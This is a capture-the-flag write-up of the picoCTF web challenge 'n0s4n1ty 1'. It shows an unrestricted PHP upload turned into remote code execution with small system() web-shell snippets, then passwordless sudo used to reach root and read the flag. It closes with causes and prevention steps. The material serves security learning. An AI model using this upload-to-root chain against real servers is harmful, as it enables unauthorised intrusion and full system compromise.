# n0s4n1ty 1 — Full CTF Write-Up

| | |
|---|---|
| **Platform** | picoCTF |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Focus** | Unrestricted File Upload → Remote Code Execution → Privilege Escalation |

---

## Challenge

The challenge provides a web application with a profile-picture upload feature.

The description hints that the upload functionality is flawed and that the final flag is located somewhere under:

```
/root
```

The goal was not just to obtain the flag, but to understand the complete exploitation chain and why the vulnerabilities existed.

### Category

Web Exploitation

This challenge combines:

- File upload vulnerabilities
- Server-side code execution
- Linux privilege enumeration
- sudo misconfiguration
- Privilege escalation

---

## Vulnerability

The challenge contains two major security weaknesses:

### 1. Unrestricted File Upload

The application allows users to upload files without properly validating whether they are actually images.

More importantly, it allows PHP files to be uploaded into a web-accessible directory:

```
/uploads/
```

Because PHP files in this directory are interpreted by the web server, uploading a malicious PHP file results in Remote Code Execution (RCE).

### 2. Dangerous sudo Configuration

The web-service account `www-data` was configured with:

```
(ALL) NOPASSWD: ALL
```

This means `www-data` could execute any command as any user, including root, without entering a password.

Therefore, the two vulnerabilities combine into:

```
Unrestricted File Upload
        ↓
PHP Code Execution
        ↓
RCE as www-data
        ↓
Misconfigured sudo
        ↓
Root privileges
```

---

## Initial Clue

The challenge description mentioned a profile picture upload and indicated that the implementation was flawed.

This immediately suggested investigating the upload functionality.

The important questions were:

- What endpoint handles the upload?
- What parameter contains the uploaded file?
- Does the server validate the file type?
- Where is the uploaded file stored?
- Can the uploaded file be accessed?
- Does the server execute uploaded PHP files?
- What privileges does the resulting code execution have?

This gave us a systematic enumeration path instead of blindly trying payloads.

---

## Enumeration

### 1. Identify the Upload Endpoint

Using the browser and Developer Tools, we inspected the upload request.

The request was:

```
POST /upload.php
```

and used:

```
Content-Type: multipart/form-data
```

The uploaded file was sent through the parameter:

```
fileToUpload
```

The application stored uploaded files under:

```
uploads/
```

So conceptually the request looked like:

```
POST /upload.php

fileToUpload=<uploaded file>
submit=Upload File
```

### 2. Test File Validation

Rather than assuming the application only accepted images, we tested different file extensions.

```
test.jpg  → accepted
test.txt  → accepted
test.php  → accepted
```

This was our first major finding.

The application did not properly restrict uploads to image files.

This suggested an unrestricted file-upload vulnerability.

---

## Exploitation — Part 1

### 3. Test PHP Execution

We created a harmless PHP file:

```php
<?php echo "PHP_EXEC_TEST"; ?>
```

After uploading it, the application reported that the file was stored in:

```
uploads/test.php
```

We then accessed the uploaded file through the browser.

The page displayed:

```
PHP_EXEC_TEST
```

This confirmed that the server was executing uploaded PHP code.

Therefore:

```
Arbitrary File Upload
        ↓
PHP Upload
        ↓
PHP Execution
        ↓
Remote Code Execution
```

### 4. Identify the Execution User

Once PHP execution was confirmed, we used:

```php
<?php
system("whoami");
?>
```

The result was:

```
www-data
```

We then used:

```php
<?php
system("id");
?>
```

which returned:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This told us that our code was executing as the Apache/web-service account:

```
www-data
```

Importantly:

> RCE does not automatically mean root access.

At this point we had:

```
Attacker
   ↓
PHP RCE
   ↓
www-data
```

### 5. Enumerate the Environment

We checked the current working directory:

```
/var/www/html/uploads
```

and examined the web root:

```
/var/www/html
├── index.php
├── upload.php
└── uploads/
```

The upload directory was located inside the web root:

```
/var/www/html/uploads
```

This was important because files placed there could be requested through the web server.

### 6. Inspect the Application Source Code

Since `www-data` could read the application files, we inspected:

```
/var/www/html/upload.php
```

The relevant code was:

```php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
```

The application then moved the uploaded file:

```php
move_uploaded_file(
    $_FILES["fileToUpload"]["tmp_name"],
    $target_file
);
```

There was no effective server-side check restricting the upload to legitimate image files.

The source even contained the comment:

```php
// Removed the MIME type check to allow PHP files
```

This explained exactly why our `.php` file was accepted.

### 7. Inspect the Client-Side Code

We also examined `index.php`.

The JavaScript contained:

```javascript
var file = input.files[0];
var type = file.type;
```

However, the MIME type was only obtained for the browser-side image preview.

It was not used to enforce a security restriction.

The browser then displayed the selected file using:

```javascript
output.src = URL.createObjectURL(event.target.files[0]);
```

This demonstrates an important security principle:

> Client-side validation is not a security boundary.

An attacker can bypass JavaScript completely by sending the HTTP request directly using tools such as Burp Suite or curl.

Security validation must happen on the server.

---

## Exploitation — Part 2

### 8. Check Access to /root

The challenge stated that the flag was located under:

```
/root
```

We tested:

```bash
ls -la /root
```

as `www-data`.

The result was:

```
Permission denied
```

This confirmed that `www-data` could not directly access the root user's directory.

We therefore needed to investigate possible privilege escalation.

### 9. Enumerate sudo Permissions

We checked:

```bash
sudo -l
```

The important output was:

```
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```

This was the critical privilege-escalation finding.

It means:

- **(ALL)** — `www-data` can run commands as any user.
- **NOPASSWD** — A password is not required.
- **ALL** — There is no restriction on which commands can be executed.

Therefore:

```
www-data
    ↓
sudo
    ↓
any command
    ↓
any user
    ↓
root
```

### 10. Confirm Privilege Escalation

Before accessing sensitive data, we tested the privilege level with:

```bash
sudo whoami
```

The result was:

```
root
```

This confirmed that the web-service account could successfully execute commands with root privileges.

Our complete exploitation chain was now:

```
Profile Picture Upload
        ↓
Arbitrary File Upload
        ↓
Upload .php
        ↓
PHP executes
        ↓
RCE as www-data
        ↓
sudo -l
        ↓
NOPASSWD: ALL
        ↓
Root privileges
```

### 11. Locate the Flag

Now that root access was confirmed, we enumerated `/root`:

```bash
sudo ls -la /root
```

The directory contained:

```
flag.txt
```

We could then read the specific file:

```bash
sudo cat /root/flag.txt
```

The flag was successfully retrieved.

---

## Tools

### Browser / Developer Tools

Used to:

- Inspect the upload form
- Identify the upload endpoint
- Inspect HTTP requests
- Identify the `fileToUpload` parameter
- Observe upload responses

### PHP

Used to create harmless test files and demonstrate server-side code execution.

### Linux commands

We used commands including:

```
whoami
id
pwd
ls -la
sudo -l
find
getcap
```

These were used for:

- Identity enumeration
- Permission enumeration
- Filesystem enumeration
- Privilege escalation discovery

### Apache + PHP

Understanding the server stack was important because the uploaded `.php` file was interpreted by PHP rather than treated as an ordinary static file.

---

## What I Learned

### 1. Never assume an upload is restricted

A feature called "profile picture upload" doesn't necessarily mean the server only accepts images.

Always test:

```
.jpg
.png
.txt
.php
```

and determine what the server actually accepts.

### 2. File upload and code execution are different concepts

Uploading a PHP file alone does not necessarily mean RCE.

The complete chain requires:

```
Upload PHP
     ↓
File accessible
     ↓
Server interprets PHP
     ↓
Code executes
```

If the server stores PHP as a static file, the upload may not result in RCE.

### 3. Client-side validation isn't security

JavaScript can improve the user experience, but it cannot protect the server.

An attacker can bypass the browser completely and send their own HTTP request.

Therefore:

```
Client-side validation
        ≠
Security validation
```

### 4. RCE doesn't necessarily mean root

Our initial RCE was:

```
www-data
```

not:

```
root
```

We had to enumerate the system and discover the privilege-escalation opportunity.

This demonstrates the difference between:

**Initial Access** — PHP upload → `www-data`

and

**Privilege Escalation** — `www-data` → `root`

### 5. sudo -l is an important enumeration command

After obtaining access to a Linux system, checking:

```bash
sudo -l
```

can reveal commands the current user is allowed to execute with elevated privileges.

In this challenge, it immediately revealed:

```
(ALL) NOPASSWD: ALL
```

which was the intended escalation path.

---

## Why the Vulnerability Existed

The primary vulnerability existed because the application did not perform proper server-side validation of uploaded files.

The application essentially did:

```
Receive file
    ↓
Take user-controlled filename
    ↓
Place file into uploads/
    ↓
Web server executes PHP
```

There was no effective restriction preventing an attacker from uploading executable server-side code.

The upload directory was also located inside the web root:

```
/var/www/html/uploads
```

which allowed the uploaded PHP file to be accessed through the web server.

The second vulnerability existed because the system administrator granted the web-service account unrestricted passwordless sudo privileges:

```
www-data → (ALL) NOPASSWD: ALL
```

This violates the principle of least privilege.

---

## How to Prevent It

### 1. Use a server-side allowlist

Only allow known-safe file types:

```
.jpg
.jpeg
.png
```

Do not rely only on the filename extension.

### 2. Validate the actual file contents

Use server-side image processing and validation rather than trusting `filename` or `Content-Type` provided by the client.

Both can be manipulated.

### 3. Store uploads outside the web root

Instead of:

```
/var/www/html/uploads/
```

use a directory that isn't directly executable/accessed by the web server.

For example:

```
/var/uploads/
```

Then serve images through controlled application logic if necessary.

### 4. Disable script execution in upload directories

Even if an attacker manages to upload something with a `.php` extension, the upload directory should not permit PHP execution.

This provides another layer of defense.

### 5. Generate server-side filenames

Don't directly use:

```php
$_FILES["fileToUpload"]["name"]
```

as the final filename.

Generate a random server-side filename instead.

For example:

```
user-uploaded-name.php
```

should become something like:

```
8f31c2a91b4e.jpg
```

### 6. Enforce file-size limits

Restrict upload sizes to prevent:

- Disk exhaustion
- Resource abuse
- Denial-of-service conditions

### 7. Never give www-data unrestricted sudo

This is especially important.

Never configure:

```
www-data ALL=(ALL) NOPASSWD: ALL
```

A web-service account should have minimal privileges.

If elevated functionality is genuinely required, restrict it to a specific command and appropriate arguments.

---

## Final Attack Chain

The entire challenge can be summarized as:

```
                    n0s4n1ty 1
                         │
                         ▼
              Profile Picture Upload
                         │
                         ▼
               /upload.php
                         │
                         ▼
             fileToUpload parameter
                         │
                         ▼
              No proper file validation
                         │
                         ▼
                  Upload .php
                         │
                         ▼
              /uploads/test.php
                         │
                         ▼
                PHP Code Execution
                         │
                         ▼
                    www-data
                         │
                         ▼
                    sudo -l
                         │
                         ▼
              (ALL) NOPASSWD: ALL
                         │
                         ▼
                       root
                         │
                         ▼
                  /root/flag.txt
                         │
                         ▼
                       FLAG
```

---

## Key Takeaway

The biggest lesson from n0s4n1ty 1 isn't the PHP payload or the flag.

It's the methodology:

```
Enumerate
   ↓
Understand the application
   ↓
Test assumptions
   ↓
Identify the vulnerability
   ↓
Confirm code execution
   ↓
Enumerate privileges
   ↓
Escalate
   ↓
Access the objective
```

The challenge demonstrates how a seemingly harmless profile-picture upload can become a complete system compromise when file validation, upload storage, PHP execution, and Linux privileges are all improperly configured.